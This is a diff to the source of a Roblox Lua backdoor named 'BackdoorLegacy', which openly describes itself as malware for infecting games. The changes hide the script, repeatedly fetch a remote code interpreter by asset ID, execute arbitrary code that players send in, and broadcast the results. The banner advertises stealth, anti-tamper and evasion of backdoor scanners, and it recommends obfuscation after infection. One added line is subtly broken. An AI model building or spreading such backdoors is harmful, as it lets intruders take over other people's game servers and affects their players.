@@ -17,8 +17,10 @@ if game:GetService("RunService"):IsStudio() then
 end
 
 -- this hides the script, potentially securing the backdoor
-getfenv().script:Destroy()
-getfenv().script = nil
+pcall(function()
+	getfenv().script:Destroy()
+	getfenv().script = nil 
+end)
 
 print([[-- Infected with BackdoorLegacy by IvanTheSkid
 -- github.com/IvanTheProtogen/BackdoorLegacy
@@ -28,7 +30,8 @@ print([[-- Infected with BackdoorLegacy by IvanTheSkid
 -- -- Anti-tamper remote
 -- -- Compatibility with any backdoor scanner
 -- -- Multiple code execution support 
--- -- Stealthiness
+-- -- Stealthiness 
+-- -- Shortcuts (%username%, %userid%)
 
 -- INTERACTION WITH THE BACKDOOR WILL EXPOSE YOU!
 -- DATA INCLUDED:
@@ -41,7 +44,7 @@ print([[-- Infected with BackdoorLegacy by IvanTheSkid
 -- IT IS RECOMMENDED TO OBFUSCATE THE CODE AFTER INFECTING IT WITH THIS BACKDOOR
 ]])
 
-local loadstring = require(14132891321)
+local loadstring
 local rmt
 local conA
 local conB
@@ -49,16 +52,26 @@ local newBD
 local delBD
 local onExec
 local onExecP
-local onTamper
+local onTamper 
+while (task.wait or wait or true)() do 
+	print("FETCHING INTERPRETER...")
+	local suc 
+	suc,loadstring = pcall(require,14132891321)
+	if suc and loadstring then 
+		print("INTERPRETER FETCHED")
+		break 
+	end 
+end
 function onExec(plr,...)
 	for i,v in pairs({...}) do
-		print("EXECUTING CODE:",...)
-		onExecP(pcall(function()return loadstring:SpawnS(v,workspace)end))
+		print(plr.Name,"REQUESTED CODE:",v)
+		v = v:gsub("%username%",v.Name):gsub("%userid%",v.UserId)
+		onExecP(plr,v,pcall(function()return loadstring:SpawnS(v,workspace)end))
 	end
 end
-function onExecP(...)
+function onExecP(plr,v,...)
 	print("EXECUTION RESULT: [",...,"]")
-	rmt:FireAllClients(plr,v)
+	rmt:FireAllClients(plr,v,...)
 end
 function newBD()
 	for _,inst in game:GetDescendants() do 
